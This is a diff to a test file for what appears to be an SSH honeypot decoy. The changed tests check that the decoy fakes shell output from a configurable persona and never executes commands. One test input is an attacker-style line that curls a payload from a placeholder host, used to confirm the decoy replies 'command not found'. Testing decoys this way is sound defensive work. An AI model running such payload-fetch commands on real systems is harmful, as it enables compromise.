@@ -2,14 +2,14 @@ import hashlib
 import io
 
 from aegis_nexus.sensors.legacy import _readline, _readline_with_status
-from aegis_nexus.sensors.ssh_decoy import _base_observed, _fake_command, _read_command
+from aegis_nexus.sensors.ssh_decoy import PERSONA as SSH_PERSONA, _base_observed, _fake_command, _read_command
 from aegis_nexus.sensors import web_decoy
 
 
 def test_ssh_commands_are_emulated_not_executed():
-    assert _fake_command("whoami") == "ops\n"
+    assert _fake_command("whoami") == f"{SSH_PERSONA.username}\n"
     assert "command not found" in _fake_command("curl http://example.invalid/payload")
-    assert _fake_command("cat /etc/hostname") == "meridian-edge-01\n"
+    assert _fake_command("cat /etc/hostname") == f"{SSH_PERSONA.hostname}\n"
 
 
 def test_legacy_reader_rejects_oversized_line():
